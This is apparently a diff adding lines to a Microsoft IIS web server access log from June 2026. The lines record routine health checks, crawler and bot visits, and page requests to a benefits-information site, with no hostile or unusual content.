+2026-06-08 13:30:13 10.3.0.63 GET /favicon.ico - 443 - 71.6.134.237 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/133.0.0.0+Safari/537.36 - 200 0 0 15406 228 24
+2026-06-08 13:35:01 10.3.0.63 GET / - 443 - 52.53.11.98 - - 200 0 0 10280 65 12
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 14:30:07
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 14:30:07 10.3.0.63 GET /l2svc/api/Organizations site=1&_=1780914606&X-ARR-CACHE-HIT=0&X-ARR-LOG-ID=47a13cd5-ed83-4343-a142-459693bf503b&SERVER-STATUS=200 443 - 54.215.96.161 - - 200 0 0 2409 196 46
+2026-06-08 14:30:07 10.3.0.63 POST /l2svc/Token X-ARR-CACHE-HIT=0&X-ARR-LOG-ID=cdb7ff01-b5c5-447d-aaf0-62e8c45ae9f5&SERVER-STATUS=200 443 - 54.215.96.161 - - 200 0 0 5249 314 69
+2026-06-08 14:35:01 10.3.0.63 GET / - 443 - 54.177.250.40 - - 200 0 0 10280 65 2
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 15:00:14
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 15:00:14 10.3.0.63 GET /_logshare.htm - 443 - 73.158.47.236 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/104.0.0.0+Safari/537.36 - 200 0 0 2367 649 13
+2026-06-08 15:11:51 10.3.0.63 GET /robots.txt - 443 - 47.128.32.219 Mozilla/5.0+(Linux;+Android+5.0)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Mobile+Safari/537.36+(compatible;+Bytespider;+spider-feedback@bytedance.com) - 200 0 0 2142 255 178
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 15:35:01
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 15:35:01 10.3.0.63 GET / - 443 - 54.67.89.73 - - 200 0 0 10280 65 17
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 16:33:52
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 16:33:51 10.3.0.63 HEAD / - 443 - 54.85.120.2 Mozilla/5.0+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Chrome/139.0.0.0+Safari/605.1.15 - 200 0 0 1945 191 68
+2026-06-08 16:35:01 10.3.0.63 GET / - 443 - 18.145.82.121 - - 200 0 0 10280 65 2
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 17:35:02
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 17:35:01 10.3.0.63 GET / - 443 - 54.67.154.147 - - 200 0 0 10280 65 42
+2026-06-08 17:39:03 10.3.0.63 GET / - 443 - 20.169.78.204 Mozilla/5.0+AppleWebKit/537.36+(KHTML,+like+Gecko);+compatible;+ChatGPT-User/1.0;++https://openai.com/bot - 200 0 0 3425 487 19
+2026-06-08 17:47:14 10.3.0.63 GET / - 443 - 216.226.76.30 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/133.0.0.0+Safari/537.36 - 200 0 0 5398 202 144
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 18:30:22
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 18:30:21 10.3.0.63 GET /robots.txt - 443 - 52.167.144.55 Mozilla/5.0+AppleWebKit/537.36+(KHTML,+like+Gecko;+compatible;+bingbot/2.0;++http://www.bing.com/bingbot.htm)+Chrome/116.0.1938.76+Safari/537.36 - 200 0 0 143 355 69
+2026-06-08 18:35:01 10.3.0.63 GET / - 443 - 54.193.121.117 - - 200 0 0 10280 65 41
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 19:35:01
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 19:35:01 10.3.0.63 GET / - 443 - 54.183.85.6 - - 200 0 0 10280 65 1
+2026-06-08 19:37:39 10.3.0.63 GET / - 80 - 18.202.33.121 Mozilla/5.0+(compatible;+NetcraftSurveyAgent/1.0;++info@netcraft.com) - 302 0 0 1966 360 126
+2026-06-08 19:37:43 10.3.0.63 GET / - 443 - 18.202.33.121 Mozilla/5.0+(compatible;+NetcraftSurveyAgent/1.0;++info@netcraft.com) - 200 0 0 10299 360 129
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 20:33:46
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 20:33:45 10.3.0.63 GET /robots.txt - 443 - 3.225.222.203 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_10_1)+AppleWebKit/600.2.5+(KHTML,+like+Gecko)+Version/8.0.2+Safari/600.2.5+(Gort) - 200 0 0 2135 238 58
+2026-06-08 20:35:01 10.3.0.63 GET / - 443 - 54.67.155.59 - - 200 0 0 10280 65 38
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 21:35:02
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 21:35:02 10.3.0.63 GET / - 443 - 54.215.206.195 - - 200 0 0 10280 65 13
+2026-06-08 21:39:37 10.3.0.63 GET /planning/b2w2_co_index.aspx - 443 - 85.254.112.57 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/142.0.0.0+Safari/537.36 - 302 0 0 175 639 2181
+2026-06-08 21:39:47 10.3.0.63 GET /planning/ssdiq_index.aspx - 443 - 23.239.171.126 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/142.0.0.0+Safari/537.36 - 302 0 0 173 637 374
+2026-06-08 21:39:52 10.3.0.63 GET /index.htm - 443 - 205.234.254.140 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/142.0.0.0+Safari/537.36 - 200 0 0 3427 621 200
+2026-06-08 21:40:10 10.3.0.63 GET /planning/mbi_co_index.aspx - 443 - 195.40.31.206 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/142.0.0.0+Safari/537.36 - 302 0 0 174 638 135
+2026-06-08 21:40:29 10.3.0.63 GET /co/situations/workandbenefits/assets/program.htm - 443 - 209.127.112.61 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/142.0.0.0+Safari/537.36 - 200 0 0 15522 660 79
+2026-06-08 21:42:21 10.3.0.63 GET /co/situations/workandbenefits/assets/program2d.htm - 443 - 142.147.162.86 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/142.0.0.0+Safari/537.36 - 200 0 0 19775 662 149
+2026-06-08 21:43:25 10.3.0.63 GET /co/programs/income_support/tanf/pitfalls.htm - 443 - 191.96.124.214 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/142.0.0.0+Safari/537.36 - 200 0 0 17295 656 477
+2026-06-08 21:43:53 10.3.0.63 GET /co/situations/workandbenefits/assets/resources.htm - 443 - 68.167.134.69 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/142.0.0.0+Safari/537.36 - 200 0 0 17591 662 213
+2026-06-08 21:45:09 10.3.0.63 GET /co/programs/income_support/ssi2/program.htm - 443 - 142.147.162.165 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/142.0.0.0+Safari/537.36 - 200 0 0 16469 655 209
+2026-06-08 21:46:04 10.3.0.63 GET /co/programs/income_support/tanf/program2a.htm - 443 - 45.86.30.9 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/142.0.0.0+Safari/537.36 - 200 0 0 18754 657 547
+2026-06-08 21:46:06 10.3.0.63 GET /co/programs/income_support/ssdi2/program.htm - 443 - 75.102.11.27 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/142.0.0.0+Safari/537.36 - 200 0 0 17800 656 333
+2026-06-08 21:46:19 10.3.0.63 GET /co/situations/workandbenefits/right_job/program2.htm - 443 - 45.61.115.237 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/142.0.0.0+Safari/537.36 - 200 0 0 21623 664 208
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 22:35:01
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 22:35:00 10.3.0.63 GET / - 443 - 54.153.102.207 - - 200 0 0 10280 65 2
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-06-08 23:19:55
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+2026-06-08 23:19:55 10.3.0.63 GET / - 443 - 71.6.134.204 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/133.0.0.0+Safari/537.36 - 200 0 0 5398 202 14
+2026-06-08 23:23:34 10.3.0.63 GET /favicon.ico - 443 - 71.6.134.204 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/133.0.0.0+Safari/537.36 - 200 0 0 15406 228 14
+2026-06-08 23:35:01 10.3.0.63 GET / - 443 - 13.57.219.14 - - 200 0 0 10280 65 2
